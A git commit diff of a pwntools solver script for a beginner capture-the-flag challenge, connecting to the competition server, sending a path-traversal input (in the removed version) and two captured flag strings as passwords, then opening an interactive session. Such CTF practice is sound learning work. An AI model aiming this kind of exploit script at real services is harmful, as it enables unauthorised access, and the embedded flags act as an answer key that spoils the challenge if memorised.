0e293204fb2c961868c384973c1bc7fcf3a51f0c
saccharide <rtang@email.wm.edu>
2019-01-12 00:36:53 -0500

    Updated the xploit module to be interactive! Finally understand how this module works

--- beginner/Admin-UI/part-3/xploit.py
+++ beginner/Admin-UI/part-3/xploit.py
@@ -1,23 +1,58 @@
 from pwn import *
 
+
+# Set up pwntools for the correct architecture
+executable = context.binary = ELF ('./main')
+
+
 host = "mngmnt-iface.ctfcompetition.com"
 port = 1337
 
-def main():
-    connection = remote(host,port)
+# GDB scripts
+gdbscript = '''
+break *0x
+continue
+'''.format(**locals())
+
+# Execute the target binary locally
+def local(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([executable.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([executable.path] + argv, *a, **kw)
+
+# Connect to remote process
+def remote():
+
+    connection = connect(host, port)
+    if args.GDB:
+        gdb.attach(connection, gdbscript=gdbscript)
+    return connection
     
-    # Printing out messeage from server
-    print(connection.recv())
-    print(connection.recv())
+start = local if args.LOCAL else remote
 
-    connection.sendline("1")
+# Exploit here
+connection = start()
 
-    print(connection.recv())
-    print(connection.recv())
+# Printing out messeage from server
+print(connection.recv())
+print(connection.recv())
 
-    connection.sendline("../flag")
+connection.sendline("1")
 
-    connection.close()
+print(connection.recv())
+print(connection.recv())
+
+connection.sendline("CTF{I_luv_buggy_sOFtware}")
+
+print(connection.recv())
+print(connection.recv())
+
+connection.sendline("CTF{Two_PasSworDz_Better_th4n_1_k?}")
+
+print(connection.recv())
+print(connection.recv())
+
+connection.interactive()
 
 
-main()
